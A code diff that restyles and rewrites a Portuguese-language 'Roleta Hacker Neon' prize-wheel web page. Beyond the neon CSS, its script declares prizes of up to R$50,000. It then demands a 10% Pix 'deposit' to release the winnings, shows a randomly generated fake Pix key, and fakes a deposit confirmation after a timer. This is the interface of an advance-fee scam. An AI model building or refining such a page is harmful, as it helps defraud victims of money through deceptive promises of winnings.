@@ -1,8 +1,147 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Roleta Hacker Neon</title>
 
-    /* ======== GLOW ANIMATIVO DA ROLETA ======== */
-    @keyframes neon{
-        0%{box-shadow:0 0 12px #0ff}50%{box-shadow:0 0 24px #ff0066}100%{box-shadow:0 0 12px #0ff}
-    }
+<!-- Fonte estilo arcade -->
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+
+<style>
+/* ======== RESET / BASE ======== */
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{
+    height:100%;
+    font-family:'Press Start 2P',monospace;
+    background:#020409;
+    color:#0ff;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    overflow:hidden;
+    text-shadow:0 0 6px currentColor;
+}
+
+/* ======== FUNDO CYBERPUNK ======== */
+body::before{                    /* grade animada */
+    content:'';
+    position:absolute;
+    inset:0;
+    background:
+      repeating-linear-gradient(0deg ,transparent 0 1px,#00ffd530 2px 40px),
+      repeating-linear-gradient(90deg,transparent 0 1px,#00ffd530 2px 40px);
+    animation:grid 30s linear infinite;
+    z-index:-1;
+}
+@keyframes grid{to{background-position:0 40px,40px 0}}
+
+/* ======== TÍTULO COM PULSO NEON ======== */
+h1{
+    font-size:1.6rem;
+    margin-bottom:32px;
+    animation:pulse 3s ease-in-out infinite;
+}
+@keyframes pulse{
+    0%,100%{text-shadow:0 0 6px #0ff,0 0 12px #0ff}
+    50%{text-shadow:0 0 12px #ff0066,0 0 24px #ff0066}
+}
+
+/* ======== ROLETA ======== */
+#wheelWrap{position:relative;width:320px;height:320px;animation:spinGlow 6s linear infinite}
+@keyframes spinGlow{
+    0%  {filter:drop-shadow(0 0 6px #ff0066)}
+    50% {filter:drop-shadow(0 0 16px #0ff)}
+    100%{filter:drop-shadow(0 0 6px #ff0066)}
+}
+canvas{
+    width:100%;height:100%;
+    border:6px solid #0ff;
+    border-radius:50%;
+    box-shadow:0 0 15px #0ff,0 0 25px #0ff inset;
+}
+.pointer{
+    position:absolute;
+    top:50%;left:50%;
+    transform:translate(-50%,-148%);
+    width:0;height:0;
+    border-left:18px solid transparent;
+    border-right:18px solid transparent;
+    border-bottom:32px solid #ff0066;
+    filter:drop-shadow(0 0 6px #ff0066);
+}
+
+/* ======== BOTÃO GIRAR – efeito glitch ======== */
+#spinBtn{
+    margin-top:30px;
+    padding:14px 40px;
+    font-size:1rem;
+    color:#000;
+    background:#0ff;
+    border:none;border-radius:4px;
+    cursor:pointer;
+    overflow:hidden;
+    position:relative;
+}
+#spinBtn:disabled{opacity:.45;cursor:not-allowed}
+#spinBtn::before,#spinBtn::after{          /* linhas glitch */
+    content:'';
+    position:absolute;
+    inset:0;
+    background:#ff0066;
+    mix-blend-mode:overlay;
+    opacity:0;
+    animation:glitch 2s infinite;
+}
+#spinBtn::after{
+    background:#00ffd5;
+    animation:glitch 2s infinite .3s;
+}
+@keyframes glitch{
+    0%,5%{clip-path:polygon(0 0,100% 0,100% 10%,0 10%)}
+    10%,15%{clip-path:polygon(0 25%,100% 25%,100% 40%,0 40%)}
+    20%,25%{clip-path:polygon(0 55%,100% 55%,100% 70%,0 70%)}
+    30%,35%{clip-path:polygon(0 80%,100% 80%,100% 95%,0 95%)}
+    40%,100%{opacity:0}
+}
+
+/* ======== CONTADOR DE TENTATIVAS ======== */
+#tries{margin-top:14px;font-size:.7rem;opacity:.8}
+
+/* ======== MODAL & OVERLAY ======== */
+#overlay{
+    position:fixed;inset:0;
+    background:#000c;
+    display:none;align-items:center;justify-content:center;
+    backdrop-filter:blur(2px);
+    z-index:10;
+}
+#modal{
+    background:#05101a;
+    border:2px solid #0ff;
+    width:90%;max-width:360px;
+    padding:26px 22px;
+    text-align:center;
+    color:#fff;
+    border-radius:8px;
+    box-shadow:0 0 18px #0ff,0 0 10px #ff0066 inset;
+    animation:pop .4s ease;
+}
+@keyframes pop{from{transform:scale(.4);opacity:0}to{transform:scale(1);opacity:1}}
+#modal strong{color:#ff0066;text-shadow:0 0 4px #ff0066}
+#pixKey{
+    width:100%;padding:8px;margin-top:12px;
+    background:#000;border:1px solid #0ff;color:#0ff;text-align:center;
+}
+#modal button{
+    margin-top:18px;margin-inline:4px;padding:10px 16px;
+    font-size:.7rem;border:none;cursor:pointer;font-weight:bold;
+}
+#copiar{background:#00ffd5;color:#000}
+#depositar{background:#ff0066;color:#fff}
+#depositar:disabled{opacity:.55;cursor:not-allowed}
+#loader{display:none;margin-top:16px;font-size:.8rem;color:#0ff}
 </style>
 </head>
 <body>
@@ -19,24 +158,135 @@
 
 <!-- Overlay / Modal -->
 <div id="overlay">
-    <div id="modal">
-        <p id="msgPremio"></p>
-        <p id="msgDeposito"></p>
-        <input id="pixKey" readonly style="width:100%;padding:6px;margin-top:10px;text-align:center">
-        <br>
-        <button id="copiar">Copiar Pix</button>
-        <button id="depositar">Depositar</button>
-        <div id="loader">⏳ Aguardando confirmação...</div>
-    </div>
+  <div id="modal">
+    <p id="msgPremio"></p>
+    <p id="msgDeposito"></p>
+    <input id="pixKey" readonly>
+    <br>
+    <button id="copiar">Copiar Pix</button>
+    <button id="depositar">Depositar</button>
+    <div id="loader">⏳ Aguardando confirmação...</div>
+  </div>
 </div>
 
 <script>
-/* ======== CONFIG ======== */
-const prizes = [
-  {label:'Perdeu',   color:'#1a1e26', win:false},
-  {label:'1000',     color:'#00d0ff', win:true},
-  {label:'5000',     color:'#ff0066', win:true},
-  {label:'Perdeu',   color:'#1a1e26', win:false},
-  {label:'10000',    color:'#00ff9d', win:true},
-  {label:'20000',    color:'#ff0066', win:true},
-  {label:'Perdeu',   color:'#1a1e26', win:
+/* ========= TODA A LÓGICA ORIGINAL ========= */
+const prizes=[
+  {label:'Perdeu', color:'#1a1e26', win:false},
+  {label:'1000',   color:'#00d0ff', win:true},
+  {label:'5000',   color:'#ff0066', win:true},
+  {label:'Perdeu', color:'#1a1e26', win:false},
+  {label:'10000',  color:'#00ff9d', win:true},
+  {label:'20000',  color:'#ff0066', win:true},
+  {label:'Perdeu', color:'#1a1e26', win:false},
+  {label:'50000',  color:'#00d0ff', win:true}
+];
+const slice=360/prizes.length;
+
+const cvs=document.getElementById('wheel');
+const ctx=cvs.getContext('2d');
+const spinBtn=document.getElementById('spinBtn');
+const triesTxt=document.getElementById('tries');
+const overlay=document.getElementById('overlay');
+const msgPremio=document.getElementById('msgPremio');
+const msgDeposito=document.getElementById('msgDeposito');
+const pixKeyInput=document.getElementById('pixKey');
+const copyBtn=document.getElementById('copiar');
+const depBtn=document.getElementById('depositar');
+const loader=document.getElementById('loader');
+
+let angStart=0, angVel=0, spinning=false, tries=0;
+
+/* ---- desenha ---- */
+function drawWheel(){
+  ctx.clearRect(0,0,300,300);
+  for(let i=0;i<prizes.length;i++){
+    const ang=(angStart+i)*slice*Math.PI/180;
+    ctx.beginPath();
+    ctx.moveTo(150,150);
+    ctx.arc(150,150,150,ang,ang+slice*Math.PI/180);
+    ctx.fillStyle=prizes[i].color;
+    ctx.fill();
+    ctx.save();
+    ctx.translate(150,150);
+    ctx.rotate(ang+slice*Math.PI/360);
+    ctx.textAlign='right';
+    ctx.fillStyle='#fff';
+    ctx.font='bold 18px monospace';
+    ctx.fillText(prizes[i].label,135,8);
+    ctx.restore();
+  }
+}
+
+/* ---- animação ---- */
+function frame(){
+  if(!spinning) return;
+  angVel*=0.991;
+  if(angVel<0.002){
+    spinning=false; finalize(); return;
+  }
+  angStart+=angVel; angStart%=360;
+  drawWheel();
+  requestAnimationFrame(frame);
+}
+
+/* ---- clicar girar ---- */
+spinBtn.onclick=()=>{
+  if(spinning) return;
+  spinBtn.disabled=true;
+  spinBtn.textContent='Girando...';
+  angVel=Math.random()*30+30;
+  spinning=true;
+  frame();
+};
+
+/* ---- final ---- */
+function finalize(){
+  const deg=(360-(angStart%360)+(slice/2))%360;
+  const idx=Math.floor(deg/slice);
+  const prize=prizes[idx];
+
+  tries++; triesTxt.textContent=`Tentativas: ${tries}`;
+  spinBtn.disabled=false;
+  spinBtn.textContent='Girar';
+
+  if(!prize.win){
+    alert('Que pena! Você perdeu. Tente de novo.');
+    return;
+  }
+  const valor=parseInt(prize.label);
+  const deposito=(valor*0.10).toFixed(2).replace('.',',');
+  msgPremio.innerHTML=`🎉 Você ganhou <strong>R$ ${valor.toLocaleString('pt-BR')}</strong>!`;
+  msgDeposito.innerHTML=`Deposite <strong>R$ ${deposito}</strong> para liberar o saque.`;
+  pixKeyInput.value=genPix();
+  overlay.style.display='flex';
+}
+
+/* ---- Pix & botões ---- */
+function genPix(){
+  return 'PIX-'+Math.random().toString(36).slice(2,10).toUpperCase();
+}
+copyBtn.onclick=()=>{
+  pixKeyInput.select();
+  document.execCommand('copy');
+  alert('Pix copiado!');
+};
+depBtn.onclick=()=>{
+  loader.style.display='block';
+  depBtn.disabled=true;
+  setTimeout(()=>{
+    loader.style.display='none';
+    depBtn.disabled=false;
+    overlay.style.display='none';
+    alert('Depósito confirmado! Saque liberado.');
+  },5000);
+};
+/* ---- sair do modal ao clicar fora ---- */
+overlay.addEventListener('click',e=>{
+  if(e.target===overlay && loader.style.display==='none') overlay.style.display='none';
+});
+
+drawWheel();
+</script>
+</body>
+</html>
